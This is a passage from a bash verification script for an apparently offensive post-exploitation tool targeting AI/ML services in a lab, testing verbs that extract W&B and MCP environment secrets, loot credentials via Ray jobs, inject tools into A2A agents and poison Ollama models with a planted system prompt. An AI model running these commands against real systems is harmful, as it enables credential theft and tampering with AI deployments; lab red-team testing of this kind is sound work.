        "$AIPOSTEX" openai-compat --target "$TARGET_ML:4000" enum --format jsonl

    run_capture "wandb-secrets" "$TMPDIR/wandb-secrets.json" "$TMPDIR/wandb-secrets.stderr" \
        "$AIPOSTEX" wandb --target "$TARGET_ML:8444" secrets \
        --entity acme-ml-team --project churn-prediction --format json

    if assert_artifact_ok "scan-network" "$TMPDIR/scan-network.json"; then
        assert_jq "scan-network includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/scan-network.json"
        assert_workflow_read_before_gated "scan-network recommendations are read before gated" "$TMPDIR/scan-network.json"
    fi
    if [[ "${AIPOSTEX_SKIP_ASSESS:-}" == "1" ]]; then
        skip "assess network contract check skipped (AIPOSTEX_SKIP_ASSESS=1)"
    elif [[ -f "$TMPDIR/assess-network.json" ]]; then
        assert_jq "assess network includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/assess-network.json"
    else
        fail "assess network contract artifact missing"
    fi
    if [[ -f "$TMPDIR/mcp-analyze.json" ]]; then
        assert_jq "mcp analyze includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/mcp-analyze.json"
    else
        skip "mcp analyze contract check skipped because remote MCP fixture was unavailable"
    fi

    if assert_artifact_ok "ray-job-logs" "$TMPDIR/ray-job-logs.json"; then
        assert_jq "ray job-logs includes evidence metadata" '.findings[]? | select(.metadata.evidence != null)' "$TMPDIR/ray-job-logs.json"
        assert_jq "ray job-logs includes stage" '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/ray-job-logs.json"
        assert_jq "ray job-logs includes landed" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ray-job-logs.json"
    fi
    if assert_artifact_ok "ray-job-artifacts" "$TMPDIR/ray-job-artifacts.json"; then
        assert_jq "ray job-artifacts includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/ray-job-artifacts.json"
    fi

    if assert_artifact_ok "mlflow-model-artifacts" "$TMPDIR/mlflow-model-artifacts.json"; then
        assert_jq "mlflow model-artifacts includes workflow metadata" '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/mlflow-model-artifacts.json"
        assert_jq "mlflow model-artifacts includes evidence metadata" '.findings[]? | select(.metadata.evidence != null)' "$TMPDIR/mlflow-model-artifacts.json"
    fi

    # ── landed-honesty contract ─────────────────────────────────────────────────
    # Guards the 2026-07 CLI honesty review blockers: overclaimed landed values,
    # ~40% of findings missing stage/landed metadata, and JWT mis-classification. The
    # "includes stage/landed" checks above pass if ANY finding has the field; the checks
    # below require EVERY finding to carry it AND verify the VALUES are honest —
    # which is exactly the coverage that let the original blockers slip through.
    for pf in ollama-enum ollama-prompts jupyter-notebooks litellm-config-extract mlflow-model-artifacts; do
        pf_file="$TMPDIR/$pf.json"
        [[ -f "$pf_file" ]] || continue
        assert_jq "$pf: every finding carries stage + landed" \
            '((.findings // []) | length > 0) and ([.findings[]? | select((.metadata.stage == null) or (.metadata.landed == null))] | length == 0)' \
            "$pf_file"
    done

    # jupyter pip-proof must not claim execution when pip is externally-managed.
    if [[ -f "$TMPDIR/jupyter-pip-proof.json" ]]; then
        assert_not_contains "jupyter pip-proof does not overclaim 'capability confirmed'" \
            "pip install capability confirmed" "$TMPDIR/jupyter-pip-proof.json"
        assert_jq "jupyter pip-proof: externally-managed is never execution-confirmed" \
            '[.findings[]? | select(((.evidence // "") | test("externally-managed")) and (.metadata.landed == "execution-confirmed"))] | length == 0' \
            "$TMPDIR/jupyter-pip-proof.json"
    fi

    # mlflow model-artifacts LISTING is reachable, never execution/takeover.
    if [[ -f "$TMPDIR/mlflow-model-artifacts.json" ]]; then
        assert_jq "mlflow model-artifacts listing is not execution/takeover" \
            '[.findings[]? | select((.metadata.action == "model-artifacts") and ((.metadata.landed == "execution-confirmed") or (.metadata.landed == "takeover-capable")))] | length == 0' \
            "$TMPDIR/mlflow-model-artifacts.json"
    fi

    # a2a task-status on an RPC error is only 'reachable', never read-confirmed.
    run_capture "a2a-taskstatus-missing" "$TMPDIR/a2a-taskstatus-missing.json" "$TMPDIR/a2a-taskstatus-missing.stderr" \
        "$AIPOSTEX" a2a --target "$TARGET_APP:8100" task-status --task-id verify-honesty-missing-task --format json || true
    if [[ -f "$TMPDIR/a2a-taskstatus-missing.json" ]]; then
        assert_jq "a2a task-status on RPC error is reachable (not read-confirmed)" \
            '[.findings[]? | select((.metadata.rpc_error == true) and (.metadata.landed != "reachable"))] | length == 0' \
            "$TMPDIR/a2a-taskstatus-missing.json"
    fi

    # A JWT in ollama-prompt evidence is a bearer token (untruncated), never a
    # jupyter-token, and generates no jupyter command against the ollama target.
    run_capture "ollama-prompts-honesty" "$TMPDIR/ollama-prompts-honesty.jsonl" "$TMPDIR/ollama-prompts-honesty.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" prompts --format jsonl || true
    if [[ -s "$TMPDIR/ollama-prompts-honesty.jsonl" ]]; then
        run_capture "ollama-prompts-creds" "$TMPDIR/ollama-prompts-creds.txt" "$TMPDIR/ollama-prompts-creds.stderr" \
            "$AIPOSTEX" report view "$TMPDIR/ollama-prompts-honesty.jsonl" --credentials --commands || true
        if [[ -s "$TMPDIR/ollama-prompts-creds.txt" ]]; then
            assert_not_contains "ollama JWT not mis-classified as jupyter-token" "jupyter-token" "$TMPDIR/ollama-prompts-creds.txt"
            assert_not_contains "no jupyter command generated against the ollama target" "jupyter --target" "$TMPDIR/ollama-prompts-creds.txt"
            # WS-A extractors: the AWS access key and BOTH slack webhooks leaked in the
            # prompts now surface (the second webhook was dropped by a first-match bug).
            assert_contains "ollama cred index surfaces the AWS access key" "aws-access-key" "$TMPDIR/ollama-prompts-creds.txt"
            assert_contains "ollama cred index includes the alerts slack webhook" "B0ALERTS" "$TMPDIR/ollama-prompts-creds.txt"
            assert_contains "ollama cred index includes the deploy slack webhook" "B0DEPLOY" "$TMPDIR/ollama-prompts-creds.txt"
        fi
    fi

    if assert_artifact_ok "litellm-probe" "$TMPDIR/litellm-probe.json"; then
        assert_jq "litellm-probe includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/litellm-probe.json"
    fi

    if assert_artifact_ok "litellm-enum" "$TMPDIR/litellm-enum.json"; then
        assert_jq "litellm-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/litellm-enum.json"
    fi

    if assert_artifact_ok "ollama-enum" "$TMPDIR/ollama-enum.json"; then
        assert_jq "ollama-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/ollama-enum.json"
    fi

    if assert_artifact_ok "gradio-enum" "$TMPDIR/gradio-enum.json"; then
        assert_jq "gradio-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/gradio-enum.json"
    fi

    if assert_artifact_ok "ray-enum" "$TMPDIR/ray-enum.json"; then
        assert_jq "ray-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/ray-enum.json"
    fi

    if assert_artifact_ok "mlflow-enum" "$TMPDIR/mlflow-enum.json"; then
        assert_jq "mlflow-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/mlflow-enum.json"
    fi

    # ── WS1-P3 follow-on presence: the long-tail exploit/read verbs now emit
    # concrete next-action guidance. This is the regression that catches a verb
    # that loses (or never gained) its follow-on plan. Each captured JSON must
    # carry at least one finding with a non-empty workflow.recommendations list.
    for wf in litellm-config-extract litellm-budget-probe litellm-proxy-chain \
              triton-model-config triton-shm-probe tfserving-metrics bentoml-metrics \
              wandb-projects wandb-runs wandb-artifacts wandb-secrets kubeflow-runs; do
        [[ -f "$TMPDIR/$wf.json" ]] || continue
        assert_jq "$wf emits follow-on guidance" \
            '.findings[]? | select((.metadata.workflow.recommendations? // []) | length > 0)' \
            "$TMPDIR/$wf.json"
    done

    if assert_artifact_ok "mcp-env-extract" "$TMPDIR/mcp-env-extract.json"; then
        assert_jq "mcp env-extract includes stage/landed metadata" \
            '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/mcp-env-extract.json"
        # WS-A credential index: every discovered env var carries a STRUCTURED
        # extracted_credentials record (real type, raw value), never the old flat
        # credential_value placeholder — that's what let "2 of 9" surface before.
        assert_jq "mcp env-extract: every discovered var carries structured extracted_credentials" \
            '([.findings[]? | select((.evidence // "") | test("="))] | length) as $n | ($n == 0) or ([.findings[]? | select((.evidence // "") | test("=")) | select(.metadata.extracted_credentials == null)] | length == 0)' \
            "$TMPDIR/mcp-env-extract.json"
        assert_jq "mcp env-extract carries no flat credential_value placeholder" \
            '[.findings[]? | select(.metadata.credential_value != null)] | length == 0' \
            "$TMPDIR/mcp-env-extract.json"
        # The dedicated credential index must be complete + honestly typed: the service
        # token keeps its real type (not jupyter-token), and there is no placeholder.
        run_capture "mcp-env-creds" "$TMPDIR/mcp-env-creds.txt" "$TMPDIR/mcp-env-creds.stderr" \
            "$AIPOSTEX" report view "$TMPDIR/mcp-env-extract.json" --credentials || true
        if [[ -s "$TMPDIR/mcp-env-creds.txt" ]]; then
            assert_contains "mcp cred index lists the openai key" "openai-api-key" "$TMPDIR/mcp-env-creds.txt"
            assert_contains "mcp cred index types the service token honestly" "internal-service-token" "$TMPDIR/mcp-env-creds.txt"
            assert_not_contains "mcp cred index has no credential_value placeholder" "credential_value" "$TMPDIR/mcp-env-creds.txt"
            assert_not_contains "mcp service token not mis-typed jupyter-token" "jupyter-token" "$TMPDIR/mcp-env-creds.txt"
        fi
    fi

    # ── file-discovery contract (WS-B) ──
    if [[ -f "$TMPDIR/scan-files.json" ]]; then
        # WS-B1: file-discovery findings are written directly, not through a workflow;
        # every one must still carry stage + landed (honest floor).
        assert_jq "discover files: every finding carries stage + landed" \
            '((.findings // []) | length > 0) and ([.findings[]? | select((.metadata.stage == null) or (.metadata.landed == null))] | length == 0)' \
            "$TMPDIR/scan-files.json"
        # WS-A: the GitHub PAT fixture surfaces in the dedicated credential index.
        run_capture "scan-files-creds" "$TMPDIR/scan-files-creds.txt" "$TMPDIR/scan-files-creds.stderr" \
            "$AIPOSTEX" report view "$TMPDIR/scan-files.json" --credentials || true
        if [[ -s "$TMPDIR/scan-files-creds.txt" ]]; then
            assert_contains "file-discovery cred index surfaces the GitHub PAT" "github-pat" "$TMPDIR/scan-files-creds.txt"
        fi
    fi

    # ── wandb contract checks ──
    if assert_artifact_ok "wandb-enum" "$TMPDIR/wandb-enum.json"; then
        assert_jq "wandb-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/wandb-enum.json"
    fi
    if assert_artifact_ok "wandb-secrets" "$TMPDIR/wandb-secrets.json"; then
        assert_jq "wandb-secrets includes stage metadata" \
            '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/wandb-secrets.json"
    fi

    # ── a2a contract checks ──
    if assert_artifact_ok "a2a-enum" "$TMPDIR/a2a-enum.json"; then
        assert_jq "a2a-enum includes workflow metadata" \
            '.findings[]? | select(.metadata.workflow != null)' "$TMPDIR/a2a-enum.json"
    fi
    if [[ -f "$TMPDIR/a2a-tool-inject.json" ]]; then
        assert_jq "a2a tool-inject includes stage metadata" \
            '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/a2a-tool-inject.json"
    fi
    if [[ -f "$TMPDIR/a2a-replay.json" ]]; then
        assert_jq "a2a replay includes stage metadata" \
            '.findings[]? | select(.metadata.stage != null)' "$TMPDIR/a2a-replay.json"
    fi

    # ── session export contract ──
    if [[ -f "$TMPDIR/session-export.json" ]]; then
        assert_jq "session export produces valid envelope" \
            '.session_id != null or .findings != null' "$TMPDIR/session-export.json"
    fi

    if [[ -f "$TMPDIR/oai-enum.jsonl" ]]; then
        local invalid=0
        local valid=0
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            printf '%s\n' "$line" | python3 -c 'import json,sys; json.load(sys.stdin)' >/dev/null 2>&1 \
                && valid=$((valid + 1)) \
                || invalid=$((invalid + 1))
        done < "$TMPDIR/oai-enum.jsonl"
        if [[ "$valid" -gt 0 && "$invalid" -eq 0 ]]; then
            pass "JSONL output is valid ($valid line(s))"
        elif [[ "$valid" -eq 0 ]]; then
            fail "JSONL output file is empty (0 valid lines)"
        else
            fail "JSONL output has $invalid invalid line(s)"
        fi
    else
        fail "JSONL output file was not created"
    fi
}


# ══════════════════════════════════════════════════════════════
# DESTRUCTIVE — snapshot-gated mutation tests
# ══════════════════════════════════════════════════════════════

run_destructive_layer() {
    section "destructive (snapshot-gated)"

    local snapshot_script="$HOME/lab/lab-snapshots.sh"
    local snapshot_name
    snapshot_name="pre-destructive-test-$(date +%s)"
    if [[ ! -f "$snapshot_script" ]]; then
        snapshot_script="$(dirname "$0")/../lab-snapshots.sh"
    fi

    local can_snapshot=false
    if command -v qm &>/dev/null && [[ -f "$snapshot_script" ]]; then
        can_snapshot=true
    fi

    if [[ "$can_snapshot" != "true" ]]; then
        skip "destructive layer requires Proxmox host with qm and lab-snapshots.sh"
        return
    fi

    echo "  [*] Creating pre-destructive snapshot..."
    bash "$snapshot_script" create "$snapshot_name" "Auto snapshot before destructive tests" || {
        fail "Failed to create pre-destructive snapshot"
        return
    }
    pass "Pre-destructive snapshot created"

    # Test ollama copy
    run_capture "ollama-copy" "$TMPDIR/ollama-copy.json" "$TMPDIR/ollama-copy.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" copy \
        --source acme-assistant:latest         --destination acme-assistant:test-copy \
        --force-exploit --format json
    if assert_artifact_ok "ollama-copy" "$TMPDIR/ollama-copy.json"; then
        assert_jq "ollama copy returns findings" '.findings[]?' "$TMPDIR/ollama-copy.json"
    fi

    # Test ollama create
    run_capture "ollama-create" "$TMPDIR/ollama-create.json" "$TMPDIR/ollama-create.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" create \
        --model destructive-test:latest \
        --from smollm2:135m \
        --force-exploit --format json
    if assert_artifact_ok "ollama-create" "$TMPDIR/ollama-create.json"; then
        assert_jq "ollama create returns findings" '.findings[]?' "$TMPDIR/ollama-create.json"
    fi

    # Test ollama delete
    run_capture "ollama-delete" "$TMPDIR/ollama-delete.json" "$TMPDIR/ollama-delete.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" delete \
        --model destructive-test:latest \
        --force-exploit --format json
    if assert_artifact_ok "ollama-delete" "$TMPDIR/ollama-delete.json"; then
        assert_jq "ollama delete returns findings" '.findings[]?' "$TMPDIR/ollama-delete.json"
    fi

    # Test ollama poison
    run_capture "ollama-poison" "$TMPDIR/ollama-poison.json" "$TMPDIR/ollama-poison.stderr" \
        "$AIPOSTEX" ollama --target "$TARGET_DEV:11434" poison \
        --base-model smollm2:135m \
        --new-model poison-test:latest \
        --system-prompt "Return lab verification token." \
        --force-exploit --format json
    if assert_artifact_ok "ollama-poison" "$TMPDIR/ollama-poison.json"; then
        assert_jq "ollama poison returns findings" '.findings[]?' "$TMPDIR/ollama-poison.json"
        assert_jq "ollama poison includes stage/landed metadata" '.findings[]? | select(.metadata.landed != null)' "$TMPDIR/ollama-poison.json"
    fi

    echo "  [*] Restoring pre-destructive snapshot..."
    bash "$snapshot_script" --yes restore "$snapshot_name" || {
        fail "Failed to restore pre-destructive snapshot"
        return
    }
    pass "Pre-destructive snapshot restored"

    local ollama_tags
    ollama_tags=$(curl -sf "${TARGET_DEV}:11434/api/tags" 2>/dev/null || true)
    if echo "$ollama_tags" | grep -Fqi "acme-assistant:test-copy"; then
        fail "Snapshot restore did not remove destructive test model copy"
    else
        pass "Snapshot restore removed destructive test model copy"
    fi

    echo "  [*] Cleaning up snapshot..."
    bash "$snapshot_script" --yes delete "$snapshot_name" >/dev/null 2>&1 || {
        fail "Failed to delete pre-destructive snapshot"
        return
    }
    pass "Pre-destructive snapshot deleted"
}


# ══════════════════════════════════════════════════════════════
# SESSIONS — engagement-session auto-dossier (the flag-free attendee path)
# ══════════════════════════════════════════════════════════════
#
# The rest of verify-aipostex drives every command with an explicit --format
# (and captures stdout), so the auto-dossier hook in getWriterMode NEVER fires.
# This layer is the only coverage of the real attendee workflow: `sessions
# start` marks an active engagement, then BARE finding-emitting commands
# auto-accumulate into ~/engagements/<name> with no -o/--format flags.
#
# SAFETY: an active session redirects EVERY subsequent bare-format command into
# the engagement dir. This layer therefore runs LAST under `all`, and always
# stops + removes the session (even on assertion failure) so nothing leaks.
run_sessions_layer() {
    section "sessions (engagement auto-dossier — the attendee flow)"

    local name="verify-sessions-$$"
    local dir="$HOME/engagements/$name"

    # Belt-and-suspenders teardown: guarantee the session is stopped and the dir
    # removed no matter how this function exits, so a leaked active session can't
    # redirect later runs' output.
    _sessions_teardown() {
        "$AIPOSTEX" sessions stop >/dev/null 2>&1 || true
        # rm the dir FIRST: prune only reclaims stopped sessions whose dossier is
        # empty, so the findings dir must be gone for the record to be removed.
        rm -rf "$dir" 2>/dev/null || true
        "$AIPOSTEX" sessions prune >/dev/null 2>&1 || true
    }
    _sessions_teardown  # clear any stale active session from a prior aborted run

    # 1) start marks an active engagement and creates the dossier dir
    local start_out="$TMPDIR/sessions-start.txt"
    run_capture "sessions-start" "$start_out" "${start_out%.txt}.stderr" \
        "$AIPOSTEX" sessions start "$name"
    if assert_artifact_ok "sessions start exits cleanly" "$start_out"; then
        pass "sessions start exits cleanly"
    fi
    if [[ -d "$dir" ]]; then
        pass "sessions start created engagement dir ~/engagements/$name"
    else
        fail "sessions start did not create ~/engagements/$name"
    fi

    # 2) THE HOOK: a bare command (no -o, no --format) auto-accumulates into the
    #    active engagement. Ray jobs is the reliable chain-start that loots creds.
    local bare_out="$TMPDIR/sessions-bare-ray.txt"
    run_capture "sessions-bare-ray" "$bare_out" "${bare_out%.txt}.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" jobs
    assert_artifact_ok "bare ray jobs (in-session) exits cleanly" "$bare_out" && \
        pass "bare ray jobs (in-session) exits cleanly"

    local findings="$dir/findings.jsonl"
    if [[ -s "$findings" ]]; then
        local nfind
        nfind=$(wc -l < "$findings" | tr -d ' ')
        assert_count_ge "bare command auto-accumulated findings into the session" 1 "$nfind"
    else
        fail "auto-dossier hook did not write findings.jsonl into the session"
    fi

    if [[ -s "$dir/credentials.txt" ]]; then
        pass "session captured looted credentials (credentials.txt non-empty)"
    else
        fail "session credentials.txt missing or empty after a cred-looting hop"
    fi

    # 3) report view reads the session dir back (the attendee's review step)
    local rv_creds="$TMPDIR/sessions-report-creds.txt"
    run_capture "sessions-report-creds" "$rv_creds" "${rv_creds%.txt}.stderr" \
        "$AIPOSTEX" report view "$dir" --credentials
    assert_regex "report view <session> --credentials renders looted creds" \
        "credential|LITELLM|MLFLOW|Bearer|Basic|token|key" "$rv_creds"

    # 4) sessions list surfaces the active engagement with a real finding count
    local list_out="$TMPDIR/sessions-list.txt"
    run_capture "sessions-list" "$list_out" "${list_out%.txt}.stderr" \
        "$AIPOSTEX" sessions list
    assert_contains "sessions list shows the active engagement" "$name" "$list_out"

    # 5) stop ends the engagement cleanly
    local stop_out="$TMPDIR/sessions-stop.txt"
    run_capture "sessions-stop" "$stop_out" "${stop_out%.txt}.stderr" \
        "$AIPOSTEX" sessions stop
    assert_artifact_ok "sessions stop exits cleanly" "$stop_out" && \
        pass "sessions stop exits cleanly"

    # 6) after stop, a bare command must NOT auto-accumulate (no active session)
    local post_out="$TMPDIR/sessions-post-stop.txt"
    local pre_lines=0
    [[ -s "$findings" ]] && pre_lines=$(wc -l < "$findings" | tr -d ' ')
    run_capture "sessions-post-stop" "$post_out" "${post_out%.txt}.stderr" \
        "$AIPOSTEX" ray --target "$TARGET_ML:8265" jobs --format json
    local post_lines=0
    [[ -s "$findings" ]] && post_lines=$(wc -l < "$findings" | tr -d ' ')
    if [[ "$post_lines" -eq "$pre_lines" ]]; then
        pass "after stop, bare commands no longer accumulate into the engagement"
    else
        fail "session still active after stop — findings grew $pre_lines -> $post_lines"
    fi

    _sessions_teardown
    unset -f _sessions_teardown
}


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

main() {
    local parse_status aipostex_status
    parse_args "$@"
    parse_status=$?
    if [[ "$parse_status" -ne 0 ]]; then
        exit "$parse_status"
    fi
    if [[ "$SHOW_HELP" == "true" ]]; then
        exit 0
    fi

    ensure_aipostex_binary
    aipostex_status=$?
    if [[ "$aipostex_status" -ne 0 ]]; then
        exit "$aipostex_status"
    fi

    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  aipostex Lab Verification${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    if [[ -n "$AIPOSTEX" ]]; then
        echo -e "  Binary: $AIPOSTEX"
    fi
    echo -e "  Layer:  $LAYER"
    echo ""

    if [[ "$LAYER" == "preflight" || "$LAYER" == "all" ]]; then
        run_preflight_layer
    fi
    if [[ "$LAYER" == "smoke" || "$LAYER" == "all" ]]; then
        run_smoke_layer
    fi
    if [[ "$LAYER" == "operator" || "$LAYER" == "all" ]]; then
        run_operator_layer
    fi
    if [[ "$LAYER" == "active" || "$LAYER" == "all" ]]; then
        run_active_layer
    fi
    if [[ "$LAYER" == "post-ex" ]]; then
        run_post_ex_layer
    fi
    if [[ "$LAYER" == "contract" || "$LAYER" == "all" ]]; then
        run_contract_layer
    fi
    # Sessions runs LAST under `all`: an active engagement redirects bare-format
    # output, so it must not precede the explicit-format layers above.
    if [[ "$LAYER" == "sessions" || "$LAYER" == "all" ]]; then
        run_sessions_layer
    fi
    if [[ "$LAYER" == "destructive" ]]; then
        run_destructive_layer
    fi

    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo -e "  Results: ${GREEN}${PASS} passed${NC}, ${RED}${FAIL} failed${NC}, ${YELLOW}${SKIP} skipped${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}All requested aipostex lab verification checks passed.${NC}"
        exit 0
    fi

    echo -e "${RED}Some aipostex lab verification checks failed. Review output above.${NC}"
    exit 1
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi
